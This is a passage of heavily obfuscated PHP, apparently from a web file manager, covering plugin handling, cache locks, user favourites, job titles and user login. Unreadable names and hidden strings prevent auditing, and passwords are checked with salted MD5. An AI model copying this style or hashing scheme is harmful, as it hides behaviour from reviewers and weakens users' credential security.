changeStatus($ÜµÓ²Ò, $±øÁ‘”å) { $©âåê¢Ÿ =& $_SERVER[™¸œØ®Ü]; $ŸªîØœ¸ = $this->loadList($ÜµÓ²Ò); if ($±øÁ‘”å) { Hook::apply($ÜµÓ²Ò . $©âåê¢Ÿ[2128]); } $this->update($ŸªîØœ¸[$©âåê¢Ÿ[477]], array($©âåê¢Ÿ[2129] => $±øÁ‘”å)); } public function appRegist($˜ïõàó, $À÷Ùâ…‘) { $Ü­ğæ×• =& $_SERVER[™¸œØ®Ü]; $Ä„ØÃñ = $this->loadList($˜ïõàó); if ($Ä„ØÃñ) { $this->update($Ä„ØÃñ[$Ü­ğæ×•[477]], array($Ü­ğæ×•[2121] => $À÷Ùâ…‘)); } else { $œ”ƒøÑ† = array($Ü­ğæ×•[32] => $˜ïõàó, $Ü­ğæ×•[2121] => $À÷Ùâ…‘, $Ü­ğæ×•[835] => 0, $Ü­ğæ×•[6] => $this->getConfigDefault($˜ïõàó)); $this->insert($œ”ƒøÑ†); } } public function getConfigDefault($•÷¢İµ‡) { $Ÿ¯Ôû³ =& $_SERVER[™¸œØ®Ü]; $şšÉš±‡ = array(); $¢¼Ú–à• = $this->getPackageJson($•÷¢İµ‡); if (!$¢¼Ú–à• && is_array($¢¼Ú–à•[$Ÿ¯Ôû³[2130]])) { return $şšÉš±‡; } foreach ($¢¼Ú–à•[$Ÿ¯Ôû³[2130]] as $¨Ã÷ù„ => $ÃàÄ°ƒ™) { if (!isset($ÃàÄ°ƒ™[$Ÿ¯Ôû³[452]]) || isset($şšÉš±‡[$¨Ã÷ù„])) { continue; } $şšÉš±‡[$¨Ã÷ù„] = $ÃàÄ°ƒ™[$Ÿ¯Ôû³[452]]; } return $şšÉš±‡; } public function getPackageJson($ÚšÖ·Ï) { return Hook::apply($ÚšÖ·Ï . $_SERVER[™¸œØ®Ü][2131]); } public function getConfig($¢‰’™úŠ, $¶ù®îà¶ = false) { $š‰˜¢¯ =& $_SERVER[™¸œØ®Ü]; $š·™‡ = array(); $¥ë¨²ë½ = $this->loadList($¢‰’™úŠ); if ($¥ë¨²ë½ && is_array($¥ë¨²ë½[$š‰˜¢¯[6]])) { $š·™‡ = $¥ë¨²ë½[$š‰˜¢¯[6]]; } if (!$š·™‡ || $¶ù®îà¶) { $š·™‡ = $this->getConfigDefault($¢‰’™úŠ); } return $š·™‡; } public function setConfig($šôÉõ§˜, $èöªÑ…° = false) { $Ô‚ë¨Ó¼ =& $_SERVER[™¸œØ®Ü]; $õÊ¯Œóõ = $this->loadList($šôÉõ§˜); if (!$õÊ¯Œóõ) { return !1; } $èîññ‘à = $õÊ¯Œóõ[$Ô‚ë¨Ó¼[6]]; if ($èöªÑ…° == !1) { $èîññ‘à = array(); $èöªÑ…° = $this->getConfigDefault($šôÉõ§˜); } foreach ($èöªÑ…° as $¬ÈÈ‹ÙŒ => $½šğ´Å) { $èîññ‘à[$¬ÈÈ‹ÙŒ] = is_string($½šğ´Å) ? trim($½šğ´Å) : $½šğ´Å; } $this->update($õÊ¯Œóõ[$Ô‚ë¨Ó¼[477]], array($Ô‚ë¨Ó¼[6] => $èîññ‘à)); } public function viewList() { $Êş¥ú› =& $_SERVER[™¸œØ®Ü]; $Òš©÷ûê = $this->loadList(); $this->pluginScan($Òš©÷ûê); $Òš©÷ûê = $this->loadPluginList(); $Úëİô¸¢ = array(); foreach ($Òš©÷ûê as $ÁÚçÏ°­ => $ºÓ€µÀâ) { $ŞÉÁÕÇµ = $ºÓ€µÀâ; unset($ºÓ€µÀâ[$Êş¥ú›[2121]], $ºÓ€µÀâ[$Êş¥ú›[6]]); $Ûô®Ì‘µ = PLUGIN_DIR . $ºÓ€µÀâ[$Êş¥ú›[32]] . $Êş¥ú›[2123]; if (!is_file($Ûô®Ì‘µ)) { continue; } $¹Ò´‘Äı = Hook::apply($ºÓ€µÀâ[$Êş¥ú›[32]] . $Êş¥ú›[2131]); if (!is_array($¹Ò´‘Äı)) { continue; } $Úëİô¸¢[$ÁÚçÏ°­] = array_merge($ºÓ€µÀâ, $¹Ò´‘Äı); if ($ŞÉÁÕÇµ[$Êş¥ú›[6]][$Êş¥ú›[1708]] != $¹Ò´‘Äı[$Êş¥ú›[1682]]) { Hook::apply($ºÓ€µÀâ[$Êş¥ú›[32]] . $Êş¥ú›[2128]); $ŞÉÁÕÇµ[$Êş¥ú›[6]][$Êş¥ú›[1708]] = $¹Ò´‘Äı[$Êş¥ú›[1682]]; $this->update($ºÓ€µÀâ[$Êş¥ú›[477]], array($Êş¥ú›[6] => $ŞÉÁÕÇµ[$Êş¥ú›[6]])); } } return $Úëİô¸¢; } private function loadPluginList() { $ÖÊİ¤¤ =& $_SERVER[™¸œØ®Ü]; $÷ÈÖõ‚© = $this->loadList(); if (strtolower(MOD) == $ÖÊİ¤¤[2132]) { return $÷ÈÖõ‚©; } $ˆîÎ¬ßˆ = Hook::trigger($ÖÊİ¤¤[2133], $÷ÈÖõ‚©); if ($÷ÈÖõ‚© && !$ˆîÎ¬ßˆ) { die; } return $ˆîÎ¬ßˆ ? $ˆîÎ¬ßˆ : $÷ÈÖõ‚©; } private function pluginScan($âÁ©Óœı) { $È×†¼¢õ =& $_SERVER[™¸œØ®Ü]; recursion_dir(PLUGIN_DIR, $ÂÅŒŠç•, $ ›Õş×½, 0); foreach ($ÂÅŒŠç• as $Â‹ÜŞÓ) { $Ïã½‚¯Ÿ = get_path_this($Â‹ÜŞÓ); if (isset($âÁ©Óœı[$Ïã½‚¯Ÿ]) || !file_exists($Â‹ÜŞÓ . $È×†¼¢õ[2134]) || !file_exists($Â‹ÜŞÓ . $È×†¼¢õ[2123])) { continue; } Hook::apply($Ïã½‚¯Ÿ . $È×†¼¢õ[2128]); } } } goto e‹Ú¥‡Õç–; B¾ÚÒàßÌ³: class CacheLockMemcached { public function lock($³¢¥È¢Ü, $Í†‚â¯Ò = 0) { $”ÄÏÚÂ« = Cache::init(); $ïÔ³õ¼Œ = microtime(!0) + $Í†‚â¯Ò; while (microtime(!0) < $ïÔ³õ¼Œ) { $ó”ŒŸÇ… = $”ÄÏÚÂ«->get($³¢¥È¢Ü); if (!$ó”ŒŸÇ… || $ó”ŒŸÇ… < microtime(!0)) { $¯š“’½° = $”ÄÏÚÂ«->handle->add($³¢¥È¢Ü, $ïÔ³õ¼Œ, $Í†‚â¯Ò); if ($¯š“’½°) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Šüˆ†çü) { return Cache::init()->get($Šüˆ†çü); } public function unlock($éïïİËÁ) { return Cache::init()->remove($éïïİËÁ); } } class CacheLockDatabase { public function lock($õ•”Äòù, $®×õµ”ë = 0) { $ã¡œíŸ = Model($_SERVER[™¸œØ®Ü][919]); $ğÊ©¾»ø = microtime(!0) + $®×õµ”ë; while (microtime(!0) < $ğÊ©¾»ø) { $Ç¾‚Ğ§Ã = $ã¡œíŸ->get($õ•”Äòù); if (!$Ç¾‚Ğ§Ã || $Ç¾‚Ğ§Ã < microtime(!0)) { $²Î«¹Ë = $ã¡œíŸ->set($õ•”Äòù, $ğÊ©¾»ø); if ($²Î«¹Ë) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($¡¿ø¨œ) { return Model($_SERVER[™¸œØ®Ü][919])->get($¡¿ø¨œ); } public function unlock($”êˆ¶®ñ) { Model($_SERVER[™¸œØ®Ü][919])->remove($”êˆ¶®ñ); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($ÌÜŒÛÙ, $à„‘ú®ƒ) { $Èë„ÒÇá =& $_SERVER[™¸œØ®Ü]; if (!class_exists($Èë„ÒÇá[958])) { show_json($Èë„ÒÇá[959], !1); } $this->cacheTime = $à„‘ú®ƒ; $this->handle = new Memcached(); if (is_array($ÌÜŒÛÙ[$Èë„ÒÇá[960]]) && count($ÌÜŒÛÙ[$Èë„ÒÇá[960]]) >= 1) { foreach ($ÌÜŒÛÙ[$Èë„ÒÇá[960]] as $Ù×‹¼×) { $…õà®õ = explode($Èë„ÒÇá[4], $Ù×‹¼×); $this->handle->addServer($…õà®õ[0], $…õà®õ[1]); } } else { $this->handle->addServer($ÌÜŒÛÙ[$Èë„ÒÇá[208]], $ÌÜŒÛÙ[$Èë„ÒÇá[209]]); } } public function set($Ó€Ö‘ÀÉ, $Úâ™øó, $“‹æû– = false) { $“‹æû– = $“‹æû– ? $“‹æû– : $this->cacheTime; return $this->handle->set($Ó€Ö‘ÀÉ, $Úâ™øó, $“‹æû–); } public function get($äü”¸İ¨) { return $this->handle->get($äü”¸İ¨); } public function remove($À¨Àşµ¦) { return $this->handle->delete($À¨Àşµ¦); } public function deleteAll() { return $this->handle->flush(); } } goto FÙãöññ®; bÅ”¿©£é: class UserFavModel extends ModelBase { protected $tableName = "\x75\163\145\x72\x5f\146\x61\166"; protected function cacheFunctionAlias($¬¾şçÌ) { $İöè³¤ =& $_SERVER[™¸œØ®Ü]; return array($İöè³¤[2111] => array(USER_ID, $İöè³¤[2486])); } protected function listData() { $ÉÏÎã× =& $_SERVER[™¸œØ®Ü]; $ú–‘µ¨Ú = array($ÉÏÎã×[1786] => USER_ID, $ÉÏÎã×[561] => 0); $¹ªëí„ã = $ÉÏÎã×[2487]; $±„Ñ¿Ê× = $this->field($¹ªëí„ã)->where($ú–‘µ¨Ú)->order($ÉÏÎã×[2488])->select(); return $±„Ñ¿Ê× ? $±„Ñ¿Ê× : array(); } protected function resetCache() { } protected function listView() { $ªÛ¤±Ã =& $_SERVER[™¸œØ®Ü]; $–°ÎŞÆÚ = $this->listData(); $ğÎõãœ¶ = array_filter_by_field($–°ÎŞÆÚ, $ªÛ¤±Ã[33], $ªÛ¤±Ã[492]); $ÈÑøæˆ£ = array_to_keyvalue($ğÎõãœ¶, $ªÛ¤±Ã[12], $ªÛ¤±Ã[87]); if (!$ÈÑøæˆ£) { return $–°ÎŞÆÚ; } $ÔëÀ®¬¤ = 2000; $×Éœü˜Ê = array($ªÛ¤±Ã[493] => array($ªÛ¤±Ã[494], $ÈÑøæˆ£)); $ƒµÁÔ©â = Model($ªÛ¤±Ã[915])->listSource($×Éœü˜Ê, $ÔëÀ®¬¤); $ƒµÁÔ©â = array_merge($ƒµÁÔ©â[$ªÛ¤±Ã[86]], $ƒµÁÔ©â[$ªÛ¤±Ã[85]]); $ƒµÁÔ©â = array_to_keyvalue($ƒµÁÔ©â, $ªÛ¤±Ã[193]); foreach ($–°ÎŞÆÚ as $™ãñú­ => $¬·Ä•®‹) { $øù¨¿Ù = $ƒµÁÔ©â[$¬·Ä•®‹[$ªÛ¤±Ã[87]]]; $øù¨¿Ù = $øù¨¿Ù ? $øù¨¿Ù : array(); $–°ÎŞÆÚ[$™ãñú­] = array_merge($øù¨¿Ù, $¬·Ä•®‹); } return $–°ÎŞÆÚ; } protected function addFav($Ú¼Öíö, $ğ¥şˆ¶¼ = '', $­éàƒÜ‰ = "\163\157\x75\162\143\x65") { $Ğõƒ³øµ =& $_SERVER[™¸œØ®Ü]; $¡±„Ò˜ã = array($Ğõƒ³øµ[1786] => USER_ID, $Ğõƒ³øµ[561] => 0, $Ğõƒ³øµ[498] => $­éàƒÜ‰, $Ğõƒ³øµ[497] => $Ú¼Öíö); if ($this->where($¡±„Ò˜ã)->find()) { return !1; } $¡±„Ò˜ã = array($Ğõƒ³øµ[1786] => USER_ID, $Ğõƒ³øµ[561] => 0); $²¸±¶ãæ = $this->where($¡±„Ò˜ã)->max($Ğõƒ³øµ[2020]); if (!$²¸±¶ãæ) { $²¸±¶ãæ = 0; } if (!$ğ¥şˆ¶¼ && $­éàƒÜ‰ == $Ğõƒ³øµ[492]) { $“æ­ÎÕ = Model($Ğõƒ³øµ[1440])->where(array($Ğõƒ³øµ[493] => $Ú¼Öíö))->find(); if (!$“æ­ÎÕ) { return !1; } $ğ¥şˆ¶¼ = $“æ­ÎÕ[$Ğõƒ³øµ[32]]; } $ğ¥şˆ¶¼ = $this->getAutoName($ğ¥şˆ¶¼); $¾à‘£û = array($Ğõƒ³øµ[1786] => USER_ID, $Ğõƒ³øµ[561] => 0, $Ğõƒ³øµ[496] => $ğ¥şˆ¶¼, $Ğõƒ³øµ[497] => $Ú¼Öíö, $Ğõƒ³øµ[498] => $­éàƒÜ‰, $Ğõƒ³øµ[2000] => $²¸±¶ãæ + 1); return $this->add($¾à‘£û); } protected function remove($›ŞÃ•ĞÑ) { $ëİùŞó =& $_SERVER[™¸œØ®Ü]; $ã°çË’Î = array($ëİùŞó[1786] => USER_ID, $ëİùŞó[495] => $›ŞÃ•ĞÑ); return $this->where($ã°çË’Î)->delete(); } protected function removeByName($êØ­ûÜµ) { $€ïÕáÙ× =& $_SERVER[™¸œØ®Ü]; $óÔ¦¢Ïì = array($€ïÕáÙ×[1786] => USER_ID, $€ïÕáÙ×[496] => $êØ­ûÜµ, $€ïÕáÙ×[561] => 0); return $this->where($óÔ¦¢Ïì)->delete(); } protected function rename($€«ğŸÀ¶, $ÖÁ„‡Üì) { $¨˜øÌ‚ =& $_SERVER[™¸œØ®Ü]; if ($€«ğŸÀ¶ == $ÖÁ„‡Üì) { return !1; } $Ïûë¢°­ = $this->getAutoName($ÖÁ„‡Üì); if ($ÖÁ„‡Üì != $Ïûë¢°­) { return !1; } $½Å°¡Æş = array($¨˜øÌ‚[1786] => USER_ID, $¨˜øÌ‚[561] => 0, $¨˜øÌ‚[32] => $€«ğŸÀ¶); return $this->where($½Å°¡Æş)->save(array($¨˜øÌ‚[32] => $ÖÁ„‡Üì)); } protected function resetSort($’Êäğâà) { $¿¬–ï‘á =& $_SERVER[™¸œØ®Ü]; $’Êäğâà = is_array($’Êäğâà) ? $’Êäğâà : array(); $“¡ñºŠ° = array($¿¬–ï‘á[1786] => USER_ID); for ($¥¹ÂîÉ = 0; $¥¹ÂîÉ < count($’Êäğâà); $¥¹ÂîÉ++) { $“¡ñºŠ°[$¿¬–ï‘á[495]] = $’Êäğâà[$¥¹ÂîÉ]; $this->where($“¡ñºŠ°)->save(array($¿¬–ï‘á[2000] => $¥¹ÂîÉ + 1)); } return !0; } protected function moveTop($Ò˜°ÅöŠ) { $çæúÙÌ =& $_SERVER[™¸œØ®Ü]; $Ìï¾µ÷ª = array($çæúÙÌ[1786] => USER_ID, $çæúÙÌ[561] => 0); $¿Úß±èÛ = $this->where($Ìï¾µ÷ª)->where(array($çæúÙÌ[32] => $Ò˜°ÅöŠ))->find(); if (!$¿Úß±èÛ) { return; } $Í¿ˆğŞ = $this->field($çæúÙÌ[477])->where($Ìï¾µ÷ª)->order($çæúÙÌ[2488])->select(); $Í¿ˆğŞ = array_to_keyvalue($Í¿ˆğŞ, $çæúÙÌ[12], $çæúÙÌ[477]); $âˆËûŒŠ = $Í¿ˆğŞ; $Í¿ˆğŞ = array_remove_value($Í¿ˆğŞ, $¿Úß±èÛ[$çæúÙÌ[477]]); array_unshift($Í¿ˆğŞ, $¿Úß±èÛ[$çæúÙÌ[477]]); return $this->resetSort($Í¿ˆğŞ); } protected function moveBottom($•¥Ú‘ã») { $¡–üçô‡ =& $_SERVER[™¸œØ®Ü]; $¨•øğ‡§ = array($¡–üçô‡[1786] => USER_ID, $¡–üçô‡[561] => 0); $îßŒéÎ¤ = $this->where($¨•øğ‡§)->max($¡–üçô‡[2020]); $äˆïàµõ = array($¡–üçô‡[2020] => $îßŒéÎ¤ + 1); return $this->where($¨•øğ‡§)->where(array($¡–üçô‡[32] => $•¥Ú‘ã»))->save($äˆïàµõ); } private function getAutoName($†ëôÉö‡) { $ı®‚˜”í =& $_SERVER[™¸œØ®Ü]; $‚Ğ×¢û = array($ı®‚˜”í[1786] => USER_ID, $ı®‚˜”í[561] => 0); $¾ ÕÙÊ» = $this->field($ı®‚˜”í[32])->where($‚Ğ×¢û)->select(); $¾ ÕÙÊ» = array_to_keyvalue($¾ ÕÙÊ», $ı®‚˜”í[12], $ı®‚˜”í[32]); if (!$¾ ÕÙÊ» || !in_array($†ëôÉö‡, $¾ ÕÙÊ»)) { return $†ëôÉö‡; } for ($ìœ‰’äò = 0; $ìœ‰’äò < count($¾ ÕÙÊ»); $ìœ‰’äò++) { if (!in_array($†ëôÉö‡ . "\x28{$ìœ‰’äò}\x29", $¾ ÕÙÊ»)) { return $†ëôÉö‡ . "\x28{$ìœ‰’äò}\x29"; } } return $†ëôÉö‡ . "\50{$ìœ‰’äò}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\x6d\56\152\x6f\x62\x4c\x69\x73\x74"; public $field = array("\156\141\155\x65", "\x64\145\x73\x63", "\x73\157\x72\164"); const JOB_KEY = "\x73\145\154\146\112\157\x62\x4c\x69\163\x74"; public function listData($ÒÏ®ïè’ = false, $•Ş ³Ü¬ = "\x73\x6f\x72\164", $›ıäêœ˜ = false) { return parent::listData($ÒÏ®ïè’, $•Ş ³Ü¬, $›ıäêœ˜); } public function remove($Ô÷Àá½ë) { return parent::remove($Ô÷Àá½ë); } public function add($àéôóœ) { $‘ùˆ¢ » =& $_SERVER[™¸œØ®Ü]; if ($this->findByName($àéôóœ[$‘ùˆ¢ »[32]])) { return !1; } $àéôóœ[$‘ùˆ¢ »[2020]] = $this->getSort(); return parent::insert($àéôóœ); } private function getSort() { $Ñ¹Õ©äª =& $_SERVER[™¸œØ®Ü]; $æöÜÜÉü = parent::listData(); $Ú–…‡ = array_to_keyvalue($æöÜÜÉü, $Ñ¹Õ©äª[12], $Ñ¹Õ©äª[2020]); return empty($Ú–…‡) ? 0 : max($Ú–…‡) + 1; } public function update($ÎÚÑë, $ãŸòË³È) { $ò·Ù–İ =& $_SERVER[™¸œØ®Ü]; $µ€ù§ôö = parent::listData($ÎÚÑë); $öÙ¹âÍ = $this->findByName($ãŸòË³È[$ò·Ù–İ[32]]); if (!$µ€ù§ôö || $öÙ¹âÍ && $öÙ¹âÍ[$ò·Ù–İ[477]] != $µ€ù§ôö[$ò·Ù–İ[477]]) { return !1; } return parent::update($ÎÚÑë, $ãŸòË³È); } public function setUserJob($Õš³ÓÚ, $ì¶»Î†) { $¤¬â¡’È =& $_SERVER[™¸œØ®Ü]; if (!is_array($ì¶»Î†)) { $ì¶»Î† = array($ì¶»Î†); } $ÃåøÃ®§ = parent::listData(); $…ÅÑ€ÏØ = array_to_keyvalue($ÃåøÃ®§, $¤¬â¡’È[32]); $ÃÉÎ€» = $¤¬â¡’È[456]; foreach ($ì¶»Î† as $×Š“·àñ) { if ($…ÅÑ€ÏØ[$×Š“·àñ]) { $ÃÉÎ€» .= $…ÅÑ€ÏØ[$×Š“·àñ][$¤¬â¡’È[477]] . $¤¬â¡’È[50]; } else { $ø¨Ã’’ä = $this->add($×Š“·àñ); $ÃÉÎ€» .= $ø¨Ã’’ä . $¤¬â¡’È[50]; } } $ÃÉÎ€» = rtrim($ÃÉÎ€», $¤¬â¡’È[50]); Model($¤¬â¡’È[601])->metaSet($Õš³ÓÚ, self::JOB_KEY, $ÃÉÎ€»); } public function getUserJob($ÑñÇƒ€Œ) { $÷Ÿµİä¾ = Model($_SERVER[™¸œØ®Ü][601])->metaGet($ÑñÇƒ€Œ); return $this->getUserJobInfo($÷Ÿµİä¾[self::JOB_KEY]); } public function getUserJobInfo($‹É­¶ºÔ) { $ÅÅ¿«¾ =& $_SERVER[™¸œØ®Ü]; $™»ĞÈ¾¨ = explode($ÅÅ¿«¾[50], $‹É­¶ºÔ); $çò—’Ë = parent::listData(); $çò—’Ë = array_remove_key($çò—’Ë, $ÅÅ¿«¾[233]); $´´Êê  = array(); foreach ($™»ĞÈ¾¨ as $ò¸†¸“) { if (isset($çò—’Ë[$ò¸†¸“])) { $´´Êê [] = $çò—’Ë[$ò¸†¸“]; } } return $´´Êê ; } } class UserModel extends ModelBase { protected $tableName = "\165\x73\145\162"; protected $tableMeta = array("\x74\141\142\154\145\x4e\x61\x6d\x65" => "\x75\x73\145\162\137\x6d\145\x74\141", "\x6d\x65\x74\141\106\x69\145\154\144" => "\x75\163\x65\162\x49\x44"); protected $simpleField = "\165\163\x65\x72\x49\104\54\156\x69\x63\x6b\116\141\155\145\54\x6e\141\x6d\x65\54\141\x76\141\x74\x61\x72\x2c\163\x65\170\x2c\x73\x74\141\x74\x75\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($³ÔÑºŠõ) { $Š…Ÿ”ƒ— =& $_SERVER[™¸œØ®Ü]; $ÁûÕİ = $Š…Ÿ”ƒ—[2489]; return array($Š…Ÿ”ƒ—[2078] => array($³ÔÑºŠõ[0], $ÁûÕİ), $Š…Ÿ”ƒ—[2080] => array($³ÔÑºŠõ[0], $ÁûÕİ), $Š…Ÿ”ƒ—[2490] => array($³ÔÑºŠõ[0], $ÁûÕİ)); } protected function getInfo($Úµ†àæ», $–¼×€óò = false) { $áï¶÷±¶ = $this->getInfoSimple($Úµ†àæ»); if (!is_array($áï¶÷±¶)) { return array(); } if ($–¼×€óò) { return $this->_getInfoApply($áï¶÷±¶); } return $this->cacheFunctionGet($_SERVER[™¸œØ®Ü][2082], $Úµ†àæ»); } protected function getInfoFull($”ûí€ğÌ, $Ü„Íæ¨ª = false) { $¸îÂ¿ò¢ = $this->getInfoSimple($”ûí€ğÌ); if (!is_array($¸îÂ¿ò¢)) { return array(); } if ($Ü„Íæ¨ª) { return $this->_getInfoApply($¸îÂ¿ò¢, !0); } return $this->cacheFunctionGet($_SERVER[™¸œØ®Ü][2491], $”ûí€ğÌ); } private function _getInfoApply($îÓ†æÕİ, $æ·ò‡Ç = false) { $ßç›™Èı =& $_SERVER[™¸œØ®Ü]; if (!$îÓ†æÕİ) { return $îÓ†æÕİ; } $ß–Ùóô¯ = md5($ßç›™Èı[2492] . $îÓ†æÕİ[$ßç›™Èı[985]] . $ßç›™Èı[2493] . $îÓ†æÕİ[$ßç›™Èı[32]]); $îÓ†æÕİ = $this->_listDataApplyItem($îÓ†æÕİ); $æÅ´²§Î = Model($ßç›™Èı[1440])->metaGet($îÓ†æÕİ[$ßç›™Èı[90]][$ßç›™Èı[193]]); $îÓ†æÕİ[$ßç›™Èı[2494]] = $ß–Ùóô¯; $îÓ†æÕİ[$ßç›™Èı[90]][$ßç›™Èı[2282]] = isset($æÅ´²§Î[$ßç›™Èı[2283]]) ? $æÅ´²§Î[$ßç›™Èı[2283]] : null; if ($æ·ò‡Ç) { $îÓ†æÕİ[$ßç›™Èı[543]] = $this->metaGet($îÓ†æÕİ[$ßç›™Èı[1795]]); } return $îÓ†æÕİ; } protected function getInfoSimple($Õµ„Âòµ, $†´¯ÒØ£ = false) { $íø£¾Ÿ´ =& $_SERVER[™¸œØ®Ü]; if (!$Õµ„Âòµ) { return array(); } if ($†´¯ÒØ£) { $€ Á“î¸ = $this->where(array($íø£¾Ÿ´[1795] => intval($Õµ„Âòµ)))->find(); if (!is_array($€ Á“î¸)) { return array(); } $€ Á“î¸[$íø£¾Ÿ´[2495]] = Action($íø£¾Ÿ´[2496])->parseUrl($€ Á“î¸[$íø£¾Ÿ´[2495]]); return $€ Á“î¸; } return $this->cacheFunctionGet($íø£¾Ÿ´[2083], $Õµ„Âòµ); } protected function getInfoSimpleOuter($‘ˆšµ—) { $Š÷£èß• =& $_SERVER[™¸œØ®Ü]; if (!$‘ˆšµ— || $‘ˆšµ— == 0) { return array($Š÷£èß•[1795] => $Š÷£èß•[230], $Š÷£èß•[32] => $Š÷£èß•[176] . LNG($Š÷£èß•[2497]) . $Š÷£èß•[178], $Š÷£èß•[2495] => STATIC_PATH . $Š÷£èß•[2498]); } $¨æ¤öÊÏ = $this->cacheFunctionGet($Š÷£èß•[2083], $‘ˆšµ—); $£±¶£‘Å = array_field_key($¨æ¤öÊÏ, explode($Š÷£èß•[50], $this->simpleField)); if (!$£±¶£‘Å) { return array($Š÷£èß•[1795] => $Š÷£èß•[1292], $Š÷£èß•[32] => $Š÷£èß•[176] . LNG($Š÷£èß•[2499]) . $Š÷£èß•[178], $Š÷£èß•[2495] => STATIC_PATH . $Š÷£èß•[2500]); } $£±¶£‘Å[$Š÷£èß•[2495]] = Action($Š÷£èß•[2496])->parseUrl($£±¶£‘Å[$Š÷£èß•[2495]]); return $£±¶£‘Å; } protected function groupUser($ı±§ğó) { } public static function errorLang($™ç¶‹Ù°) { $õ±ÉÁ…Æ =& $_SERVER[™¸œØ®Ü]; $´š±Ñš = array(self::ERROR_USER_NOT_EXISTS => $õ±ÉÁ…Æ[2501], self::ERROR_USER_PASSWORD_ERROR => $õ±ÉÁ…Æ[2502], self::ERROR_USER_EXIST_NAME => $õ±ÉÁ…Æ[2503], self::ERROR_USER_EXIST_PHONE => $õ±ÉÁ…Æ[2504], self::ERROR_USER_EXIST_EMAIL => $õ±ÉÁ…Æ[2505], self::ERROR_USER_LOGIN_LOCK => $õ±ÉÁ…Æ[2506], self::ERROR_IP_NOT_ALLOW => $õ±ÉÁ…Æ[2507], self::ERROR_USER_EXIST_NICKNAME => $õ±ÉÁ…Æ[2508]); $Ô «„µ = LNG($´š±Ñš[$™ç¶‹Ù°]); if ($™ç¶‹Ù° == self::ERROR_USER_LOGIN_LOCK) { $“ßï‰¹› = (int) Model($õ±ÉÁ…Æ[2509])->get($õ±ÉÁ…Æ[2510]); if ($“ßï‰¹› > 60) { $Ô «„µ = str_replace($õ±ÉÁ…Æ[91], ceil($“ßï‰¹› / 60), $Ô «„µ); } } return $Ô «„µ; } protected function metaSet($ˆù®û¾Ú, $ËƒĞÖŸ = null, $İ–… ¦Ü = null) { $this->clearCache($ˆù®û¾Ú); return parent::metaSet($ˆù®û¾Ú, $ËƒĞÖŸ, $İ–… ¦Ü); } public function getInfoByMeta($Ù±Ò—ß, $¥ß›å€‘) { $åÉá‚¨” =& $_SERVER[™¸œØ®Ü]; $‡´•ªñĞ = Model($åÉá‚¨”[2511])->where(array($åÉá‚¨”[97] => $Ù±Ò—ß, $åÉá‚¨”[452] => $¥ß›å€‘))->find(); if ($‡´•ªñĞ) { return $this->getInfo($‡´•ªñĞ[$åÉá‚¨”[1795]]); } return !1; } public function userLoginCheck($íİı²§Ã, $×®ÕÜìö) { $§Ä¯ =& $_SERVER[™¸œØ®Ü]; $½—Ø¢†³ = $this->userLoginFind($íİı²§Ã); if (!$½—Ø¢†³) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($½—Ø¢†³[$§Ä¯[1795]], $×®ÕÜìö)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($½—Ø¢†³[$§Ä¯[1795]]); } public function userLoginFind($—¯š‘Ã) { $œ„ËïñŒ =& $_SERVER[™¸œØ®Ü]; $ğ‡Ûó = array($œ„ËïñŒ[32] => $—¯š‘Ã, $œ„ËïñŒ[2295] => $—¯š‘Ã, $œ„ËïñŒ[382] => $—¯š‘Ã, $œ„ËïñŒ[2512] => $—¯š‘Ã, $œ„ËïñŒ[1096] => $œ„ËïñŒ[1098]); if ($this->nickNameRpt()) { unset($ğ‡Ûó[$œ„ËïñŒ[2295]]); } return $this->where($ğ‡Ûó)->find(); } public function clearCache($—˜”™Ùœ) { $øŒ÷ÛÄ =& $_SERVER[™¸œØ®Ü]; $this->cacheFunctionClear($øŒ÷ÛÄ[2082], $—˜”™Ùœ); $this->cacheFunctionClear($øŒ÷ÛÄ[2083], $—˜”™Ùœ); $this->cacheFunctionClear($øŒ÷ÛÄ[2491], $—˜”™Ùœ); } public function userPasswordCheck($ïßêşÚß, $À‘Ÿ¶®Á) { $ºíŸ³º¹ =& $_SERVER[™¸œØ®Ü]; $»òˆµ»Î = $this->where(array($ºíŸ³º¹[1795] => intval($ïßêşÚß)))->find(); $Íï¨Êêø = $this->metaGet($ïßêşÚß); $šÓø×¨Ò = isset($Íï¨Êêø[$ºíŸ³º¹[2513]]) ? $Íï¨Êêø[$ºíŸ³º¹[2513]] : $ºíŸ³º¹[12]; if (md5($šÓø×¨Ò . trim($À‘Ÿ¶®Á)) !== $»òˆµ»Î[$ºíŸ³º¹[985]]) { return !1; } return !0; } public function userAdd($ìğ²âÕÏ) { $¨»œ»Ãà =& $_SERVER[™¸œØ®Ü]; $ú¯¨¦® = array($¨»œ»Ãà[496] => $ìğ²âÕÏ[$¨»œ»Ãà[32]], $¨»œ»Ãà[2514] => $ìğ²âÕÏ[$¨»œ»Ãà[2206]], $¨»œ»Ãà[2515] => isset($ìğ²âÕÏ[$¨»œ»Ãà[382]]) ? $ìğ²âÕÏ[$¨»œ»Ãà[382]] : $¨»œ»Ãà[12], $¨»œ»Ãà[2516] => isset($ìğ²âÕÏ[$¨»œ»Ãà[2512]]) ? $ìğ²âÕÏ[$¨»œ»Ãà[2512]] : $¨»œ»Ãà[12], $¨»œ»Ãà[2517] => isset($ìğ²âÕÏ[$¨»œ»Ãà[2295]]) ? $ìğ²âÕÏ[$¨»œ»Ãà[2295]] : $ìğ²âÕÏ[$¨»œ»Ãà[32]], $¨»œ»Ãà[2518] => isset($ìğ²âÕÏ[$¨»œ»Ãà[2495]]) ? $ìğ²âÕÏ[$¨»œ»Ãà[2495]] : $¨»œ»Ãà[12], $¨»œ»Ãà[2519] => isset($ìğ²âÕÏ[$¨»œ»Ãà[2520]]) ? $ìğ²âÕÏ[$¨»œ»Ãà[2520]] : 1, $¨»œ»Ãà[2521] => $ìğ²âÕÏ[$¨»œ»Ãà[985]], $¨»œ»Ãà[2084] => isset($ìğ²âÕÏ[$¨»œ»Ãà[1982]]) ? 